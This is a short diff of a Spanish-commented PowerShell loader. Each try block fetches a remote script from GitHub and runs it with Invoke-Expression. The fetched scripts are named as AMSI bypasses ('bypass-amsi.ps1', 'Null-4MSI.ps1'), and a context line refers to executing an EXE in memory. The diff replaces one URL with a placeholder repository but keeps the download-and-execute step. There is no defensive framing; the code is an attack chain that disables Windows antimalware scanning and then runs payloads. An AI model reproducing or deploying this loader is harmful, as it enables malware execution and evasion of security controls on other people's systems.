@@ -1,7 +1,8 @@
 try {
-    iex (iwr -UseBasicParsing "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/bypass-amsi.ps1")
+    $scriptContent = Invoke-WebRequest -Uri "https://github.com/tu-usuario/tu-repo/raw/main/bypass-amsi.ps1" -UseBasicParsing
+    Invoke-Expression $scriptContent.Content
 } catch {
-    Write-Verbose "Error ejecutando bypass-amsi: $_"
+    Write-Verbose "Error ejecutando script: $_"
 }
 try {
     iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Null-4MSI.ps1")
@@ -29,5 +30,6 @@ try {
 } catch {
     Write-Verbose "Error ejecutando EXE en memoria: $_"
 }
+
 
 
